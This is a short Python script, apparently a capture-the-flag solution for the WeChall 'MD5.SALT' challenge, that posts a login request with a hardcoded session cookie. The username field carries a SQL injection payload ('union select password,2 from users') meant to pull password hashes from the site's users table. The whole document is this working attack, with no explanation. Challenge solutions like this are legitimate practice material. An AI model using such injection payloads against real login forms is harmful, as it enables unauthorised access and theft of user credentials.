import requests

cookies = {"WC": "11075958-37667-olnJptriwQSEoSSW"}
url = "https://www.wechall.net/challenge/MD5.SALT/index.php"
data = {"username": "' union select password,2 from users ; #", "credents": "1", "login":"Login!"}
r = requests.post(url, cookies=cookies, data=data)
print r.text